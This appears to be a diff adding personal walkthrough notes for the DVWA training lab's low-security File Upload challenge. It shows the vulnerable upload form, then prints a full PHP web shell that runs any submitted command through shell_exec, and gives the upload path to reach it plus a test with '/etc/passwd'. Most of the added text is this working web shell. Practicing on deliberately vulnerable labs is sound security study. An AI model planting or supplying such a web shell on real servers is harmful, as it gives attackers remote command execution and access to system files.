@@ -133,3 +133,134 @@ tags: [dvwa,proxy]
             - edit the body to be `token=38581812b435834ebf84ebcc2c6424d6&phrase=success&send=Submit`
         - resume by `a`
 
+
+===========
+### Low: File Upload
+
+
+- Observation 1
+  - there is a button to choose a file to upload
+  ```
+  <div class="vulnerable_code_area">
+		<form enctype="multipart/form-data" action="#" method="POST">
+			<input type="hidden" name="MAX_FILE_SIZE" value="100000" />
+			Choose an image to upload:<br /><br />
+			<input name="uploaded" type="file" /><br />
+			<br />
+			<input type="submit" name="Upload" value="Upload" />
+
+		</form>	
+</div>
+  ```
+  - when a file is uploaded, a message like "../../hackable/uploads/XXXX successfully uploaded" is displayed.
+
+- Solution1(very simple one)
+    - code the following php file (attack.php), and upload it.
+    ```
+    ```
+    - access "http://dvwa:42001/vulnerabilities/upload/../../hackable/uploads/attack.php"
+
+- Solution2(a more realistic one)
+    - code (from https://github.com/artyuum/simple-php-web-shell/blob/master/index.php )
+    ```
+    <?php
+    if (!empty($_POST['cmd'])) {
+        $cmd = shell_exec($_POST['cmd']);
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Web Shell</title>
+        <style>
+            * {
+                -webkit-box-sizing: border-box;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: sans-serif;
+                color: rgba(0, 0, 0, .75);
+            }
+
+            main {
+                margin: auto;
+                max-width: 850px;
+            }
+
+            pre,
+            input,
+            button {
+                padding: 10px;
+                border-radius: 5px;
+                background-color: #efefef;
+            }
+
+            label {
+                display: block;
+            }
+
+            input {
+                width: 100%;
+                background-color: #efefef;
+                border: 2px solid transparent;
+            }
+
+            input:focus {
+                outline: none;
+                background: transparent;
+                border: 2px solid #e6e6e6;
+            }
+
+            button {
+                border: none;
+                cursor: pointer;
+                margin-left: 5px;
+            }
+
+            button:hover {
+                background-color: #e6e6e6;
+            }
+
+            .form-group {
+                display: -webkit-box;
+                display: -ms-flexbox;
+                display: flex;
+                padding: 15px 0;
+            }
+        </style>
+
+    </head>
+
+    <body>
+        <main>
+            <h1>Web Shell</h1>
+            <h2>Execute a command</h2>
+
+            <form method="post">
+                <label for="cmd"><strong>Command</strong></label>
+                <div class="form-group">
+                    <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+                        onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                    <button type="submit">Execute</button>
+                </div>
+            </form>
+
+            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+                <h2>Output</h2>
+                <?php if (isset($cmd)): ?>
+                    <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+                <?php else: ?>
+                    <pre><small>No result.</small></pre>
+                <?php endif; ?>
+            <?php endif; ?>
+        </main>
+    </body>
+    </html>
+    ```
+    - upload it, and access to `http://dvwa:42001/vulnerabilities/upload/../../hackable/uploads/index.php` (`http://dvwa:42001/hackable/uploads/index.php`)
+    - when the webshell page is loaded, test with "echo /etc/passwd"
+
